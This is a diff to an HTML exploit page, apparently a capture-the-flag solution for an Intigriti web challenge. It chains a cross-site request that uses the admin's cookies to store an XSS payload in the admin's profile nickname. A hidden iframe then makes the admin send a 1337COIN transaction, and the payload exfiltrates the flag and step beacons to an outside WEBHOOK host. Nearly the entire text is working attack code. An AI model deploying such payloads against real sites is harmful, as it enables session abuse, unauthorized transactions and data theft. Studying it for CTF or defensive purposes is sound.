@@ -8,33 +8,48 @@ fetch(`${WEBHOOK}/?step=1_start`);
 
 const xss = `<img src=x onerror="alert('gigawatz');fetch('${WEBHOOK}/?xss=1');const f=document.body.innerHTML;const m=f.match(/INTIGRITI{[^}]+}/);if(m)fetch('${WEBHOOK}/?flag='+encodeURIComponent(m[0]))">`;
 
-const f = document.createElement('iframe');
-f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
-f.style.display = 'none';
-document.body.appendChild(f);
+// Step 1: Set ADMIN'S profile nickname to XSS (using admin's cookies!)
+fetch(`${BASE}/api/profile`, {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  credentials: 'include',
+  body: JSON.stringify({ nickname: xss })
+})
+.then(r => {
+  fetch(`${WEBHOOK}/?step=2_profile_${r.status}`);
+  return r.text();
+})
+.then(() => {
+  // Step 2: Create iframe for checkout
+  const f = document.createElement('iframe');
+  f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+  f.style.display = 'none';
+  document.body.appendChild(f);
 
-f.onload = () => {
-  fetch(`${WEBHOOK}/?step=2_loaded`);
-
-  setTimeout(() => {
-    f.contentWindow.postMessage({
-      type: 'submitTransaction',
-      transaction: {
-        nickname: xss,
-        toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
-        currency: '1337COIN',
-        amount: 1
-      }
-    }, '*');
-
-    fetch(`${WEBHOOK}/?step=3_sent`);
+  f.onload = () => {
+    fetch(`${WEBHOOK}/?step=3_loaded`);
 
     setTimeout(() => {
-      fetch(`${WEBHOOK}/?step=4_redirect`);
-      window.location = `${BASE}/marketwatch.html`;
-    }, 3000);
-  }, 2000);
-};
+      // Step 3: Make ADMIN send 1337COIN (will use admin's NEW XSS nickname!)
+      f.contentWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+          toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
+          currency: '1337COIN',
+          amount: 1
+        }
+      }, '*');
+
+      fetch(`${WEBHOOK}/?step=4_sent`);
+
+      setTimeout(() => {
+        fetch(`${WEBHOOK}/?step=5_redirect`);
+        window.location = `${BASE}/marketwatch.html`;
+      }, 3000);
+    }, 2000);
+  };
+})
+.catch(e => fetch(`${WEBHOOK}/?error=${encodeURIComponent(e.message)}`));
 </script>
 </body>
 </html>
